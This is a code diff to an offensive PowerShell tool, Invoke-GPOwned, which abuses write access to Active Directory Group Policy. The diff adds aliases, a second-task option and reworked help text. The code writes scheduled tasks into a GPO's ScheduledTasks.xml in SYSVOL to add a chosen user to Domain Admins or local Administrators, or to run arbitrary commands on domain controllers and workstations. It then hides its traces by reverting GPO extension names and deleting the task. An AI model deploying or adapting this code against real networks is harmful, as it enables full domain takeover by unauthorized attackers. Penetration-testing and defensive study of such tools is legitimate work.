@@ -40,11 +40,10 @@ function Invoke-GPOwned {
         [string]$LoadDLL,
 
         [Parameter(Mandatory=$false)]
-        [Alias("cc")]
         [string]$CMD,
         
         [Parameter(Mandatory=$false)]
-        [Alias("pcc")]
+        [Alias("ps")]
         [string]$PowerShell,
 
         [Parameter(Mandatory=$false)]
@@ -59,15 +58,17 @@ Invoke-GPOwned Help:
 Example : Invoke-GPOwned -GPOGUID {387547AA-B67F-4D7B-A524-AE01E56751DD} -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -User Administrator -Domain noteasy.local -DC dc01.noteasy.local
 
 Parameters:
--GPOGUID: Group Policy GUID
--ScheduledTasksXMLPath: Full path to the ScheduledTasks xml file
--Computer: Target computer
--Local: - adds a chosen user to the local administrators goup on the defined computer
--DA: adds the user to the domain admins group
--CMD:
--User: Target user to elevate, mandatory for Local technique
--Domain: Target domain
--LoadDLL: Load the Microsoft.ActiveDirectory.Management.dll from a custom path, if not supplied it will try to download it to the current directory
+-GPOGUID/-guid: Group Policy GUID
+-ScheduledTasksXMLPath/-xml: Full path to the ScheduledTasks xml file
+-SecondTaskXMLPath/-stx: Using the the wsadd.xml file, run commands as a domain admin on workstations that are not domain controllers 
+-Computer/-c: Target computer
+-Local: Adds a chosen user to the local administrators group on the defined computer
+-DA: Adds the user to the domain admins group
+-CMD: Execute a custom cmd command
+-PowerShell/-ps: Execute a custom powershell command
+-User/-u: Target user to elevate, mandatory for Local technique
+-Domain/-d: Target domain, current domain is used by default
+-LoadDLL/-dll: Load the Microsoft.ActiveDirectory.Management.dll from a custom path, if not supplied it will try to download it to the current directory
 "@
         return
     }
@@ -185,26 +186,26 @@ if(!($LoadDLL)){
 
     # Modifying the ScheduledTasks.xml with the gathered information #
     if($DA){
-    $dacommand = '/r net group "Domain Admins" '+$User+' /add /dom'
-    $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
-    $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
-    $encoding = 'ASCII'
-    $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
-    $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
-                Set-Content -Encoding $encoding $xmlfile -Force
-    $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
-    $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
-                Set-Content -Encoding $encoding $xmlfile -Force
-    $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
-    $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
-                Set-Content -Encoding $encoding $xmlfile -Force
-    $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
-    $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
-                Set-Content -Encoding $encoding $xmlfile -Force
-    $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
-    $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$dacommand"} |
+        $dacommand = '/r net group "Domain Admins" '+$User+' /add /dom'
+        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
+        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
+        $encoding = 'ASCII'
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                     Set-Content -Encoding $encoding $xmlfile -Force
-    Write-Output "[+] ScheduledTasks file modified to add $User to the Domain Admins group!"
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$dacommand"} |
+                        Set-Content -Encoding $encoding $xmlfile -Force
+        Write-Output "[+] ScheduledTasks file modified to add $User to the Domain Admins group!"
     } elseif($Local){
         $localcommand = '/r net localgroup Administrators '+$User+' /add'
         $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
@@ -280,13 +281,10 @@ if(!($LoadDLL)){
         $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","/r $CMD"} |
                     Set-Content -Encoding $encoding $xmlfile -Force
         Write-Output "[+] ScheduledTasks file modified with the supplied custom command!."
- 
     } if(!$CMD -and !$PowerShell) {
         Write-Output "[-] Either the -Local/-DA/-CMD/-PowerShell flags are required for execution!."
         return
     }
-    
-
     $Ext = "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
     $GPO = "CN=$guid,CN=Policies,CN=System,$domaindn"
     Write-Output "[+] Incrementing GPT.INI Version by 1"
@@ -357,13 +355,12 @@ if(!($LoadDLL)){
             }
         Write-Output "[+] User added to the local admins group!"
      }elseif($CMD -or $PowerShell){
-        for ($x = 1; $x -le 300; $x++ ){
+        for ($x = 1; $x -le 300; $x++){
             $PercentCompleted = ($x/300*100)
             Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
             Start-Sleep -Seconds 1
         }
     }
-    
     Write-Output "[+] Reverting extensions back to what they were"
     # Reverting the gPCMachineExtensionNames #
     if($noext -ne 1){
@@ -371,7 +368,6 @@ if(!($LoadDLL)){
     } else {
         Clear-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames
     }
-
     if($noext -ne 1){
     Write-Output "[+] gPCMachineExtensionNames reverted back to -> $InitialExtensions"
     } else {
@@ -381,6 +377,9 @@ if(!($LoadDLL)){
     # Trying to delete the scheduled task from the DC #
     try{
         Unregister-ScheduledTask -CimSession $dc -TaskName "OWNED" -Confirm:$false
+        if($SecondTaskXMLPath){
+            Unregister-ScheduledTask -CimSession $dc -TaskNAme "OWNED2" -Confirm:$false -Force
+        }
     }
     catch{
         Write-Error "[-] Scheduled Task Removal Failed! login to the DC and remove it manually."
